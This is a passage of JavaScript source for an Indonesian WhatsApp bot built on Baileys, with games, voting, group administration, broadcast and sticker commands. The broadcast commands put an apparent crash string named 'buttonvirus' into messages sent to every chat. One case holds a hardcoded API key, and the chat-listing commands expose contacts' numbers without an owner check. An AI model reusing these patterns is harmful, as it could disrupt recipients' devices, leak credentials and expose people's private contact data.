                    ranz.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ranz.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ranz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    ranz.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ranz.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ranz.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    ranz.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ranz.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    ranz.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    ranz.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, ranz.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./src/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                ranz.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'jodohku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await ranz.sendButtonText(m.chat, buttons, jawab, ranz.user.name, m, {mentions: ments})
            }
            break
            case 'jadian': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await ranz.sendButtonText(m.chat, buttons, jawab, ranz.user.name, m, {mentions: menst})
            }
            break
            case 'react': {
                if (!isCreator) throw mess.owner
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                ranz.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await ranz.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) throw mess.owner
                await ranz.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
            }
            break
	case 'kick': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ranz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ranz.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ranz.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ranz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ranz.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await ranz.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setname': case 'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await ranz.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await ranz.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setppbot': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                var media = await ranz.downloadAndSaveMediaMessage(quoted)
                try {
                if (args[0] == "/full") {
                const { generateProfilePicture } = require("./lib/myfunc")
                var { img } = await generateProfilePicture(media)
                await ranz.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
                } else { await ranz.updateProfilePicture(botNumber, { url: media }) }
                m.reply(mess.success)
                } catch { m.reply('Gagal Mengganti Photo Profile') }
                }
                break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await ranz.downloadAndSaveMediaMessage(quoted)
                try {
                if (args[0] == "/full") {
                const { generateProfilePicture } = require("./lib/myfunc")
                var { img } = await generateProfilePicture(media)
                await ranz.query({ tag: 'iq',  attrs: { to: m.chat, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
                } else { await ranz.updateProfilePicture(m.chat, { url: media }) }
                m.reply(mess.success)
                } catch { m.reply('Gagal Mengganti Photo Profile') }
                }
                break
            case 'tagall': {
                if (!isCreator) throw mess.owner
                if (!m.isGroup) throw mess.group                
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                teks += `⭔ @${mem.id.split('@')[0]}\n`
                }
                ranz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'hidetag': {
            if (!m.isGroup) throw mess.group
            if (!isAdmins) throw mess.admin
            ranz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Masukkan Query text!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `⭔ *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
            if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: ranz.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            ranz.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: ranz.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            ranz.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: ranz.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            ranz.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${ranz.user.id}
`
ranz.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await ranz.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await ranz.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await ranz.sendButtonText(m.chat, buttons, `Mode Group`, ranz.user.name, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await ranz.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await ranz.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await ranz.sendButtonText(m.chat, buttons, `Mode Edit Info`, ranz.user.name, m)

            }
            }
            break
            case 'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = true
                m.reply(`Antilink Aktif !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = false
                m.reply(`Antilink Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await ranz.sendButtonText(m.chat, buttons, `Mode Antilink`, ranz.user.name, m)
                }
             }
             break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                m.reply(`${ranz.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${ranz.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await ranz.sendButtonText(m.chat, buttons, `Mute Bot`, ranz.user.name, m)
                }
             }
             break
            case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await ranz.groupInviteCode(m.chat)
                ranz.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Masukkan value enable/disable'
                if (args[0] === 'enable') {
                    await ranz.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await ranz.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                ranz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let getGroups = await ranz.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: 'YOUTUBE',
                                    url: 'https://youtube.com/channel/UC7CtK1YjIz4jg_A7zIzSxzg'
                                }
                            }, {
                                urlButton: {
                                    displayText: 'INSTAGRAM',
                                    url: "https://instagram.com/itsmeefakesall?igshid=YmMyMTA2M2Y="
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: buttonvirus,
                                    id: 'kelentgfihufhgunrifruhod'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: buttonvirus,
                                    id: 'pepspeppe'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: buttonvirus,
                                    id: 'oepepepeppe'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      ranz.send5ButImg(i, txt, ranz.user.name, global.thumb, btn)
                    }
                m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{
                                urlButton: {
                                    displayText: 'YOUTUBE',
                                    url: 'https://youtube.com/channel/UC7CtK1YjIz4jg_A7zIzSxzg'
                                }
                            }, {
                                urlButton: {
                                    displayText: 'INSTAGRAM',
                                    url: "https://instagram.com/itsmeefakesall?igshid=YmMyMTA2M2Y="
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: buttonvirus,
                                    id: 'kelentgfihufhgunrifruhod'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: buttonvirus,
                                    id: 'pepspeppe'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: buttonvirus,
                                    id: 'oepepepeppe'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      ranz.send5ButImg(yoi, txt, ranz.user.name, global.thumb, btn)
		}
		m.reply('Sukses Broadcast')
            }
            break
            case 'infochat': {
                if (!m.quoted) m.reply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `⭔ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                ranz.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await ranz.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 ranz.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await ranz.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 ranz.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    ranz.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await ranz.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await ranz.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
            case 'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
            case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await ranz.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
         break
	       case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	        m.reply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await quoted.download()
	        let { floNime } = require('./lib/uploader')
	        let fatGans = await floNime(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
	        let FaTiH = await ranz.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	       break     
            case 'toimage': case 'toimg': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
